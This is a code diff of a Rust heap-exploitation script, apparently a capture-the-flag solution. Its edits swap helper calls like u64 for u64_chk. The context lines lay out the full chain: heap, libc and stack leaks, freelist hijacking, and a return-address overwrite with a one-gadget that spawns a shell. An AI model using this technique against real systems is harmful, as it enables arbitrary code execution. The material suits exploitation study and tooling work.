@@ -89,7 +89,7 @@ async fn main() -> Result<()> {
 
         let mut heap_leak = recv!(6)?;
         heap_leak.append(&mut vec![0u8, 0]);
-        u64(&heap_leak)?
+        u64_chk(&heap_leak)?
     };
     println!("heap: {:#x}", &heap_leak);
 
@@ -108,7 +108,7 @@ async fn main() -> Result<()> {
 
         let mut libc_leak = recv!(6)?;
         libc_leak.append(&mut vec![0u8, 0]);
-        u64(&libc_leak)? - 0x1ecbe0
+        u64_chk(&libc_leak)? - 0x1ecbe0
     };
     println!("libc: {:#x}", &libc_leak);
 
@@ -117,7 +117,7 @@ async fn main() -> Result<()> {
 
     // hijack freelist to get an allocation on libc environ to leak stack
     let stack_leak = {
-        modify(1, 0, p64(environ)?.len(), p64(environ)?).await?;
+        modify(1, 0, p64(environ).len(), p64(environ)).await?;
 
         alloc(20, false).await?;
         alloc(20, false).await?;
@@ -129,7 +129,7 @@ async fn main() -> Result<()> {
 
         let mut stack_leak = recv!(6)?;
         stack_leak.append(&mut vec![0u8, 0]);
-        u64(&stack_leak)?
+        u64_chk(&stack_leak)?
     };
     println!("stack: {:#x}", &stack_leak);
 
@@ -148,7 +148,7 @@ async fn main() -> Result<()> {
     // overwrite the freelist pointer to get an allocation on the stack
     let return_addr = stack_leak - 0x100;
     println!("ret leak: {:#x}", &return_addr);
-    kmodify(1, 8, p64(return_addr)?).await?;
+    kmodify(1, 8, p64(return_addr)).await?;
 
     // moves hijacked chunk to top of freelist
     alloc(32, false).await?;
@@ -157,7 +157,7 @@ async fn main() -> Result<()> {
     alloc(32, true).await?;
 
     // overwrite return addr with one gadget
-    let one_gadget = p64(libc_leak+0xe3b01)?;
+    let one_gadget = p64(libc_leak+0xe3b01);
     kmodify(2, 31, one_gadget).await?;
 
     // exit and get shell!
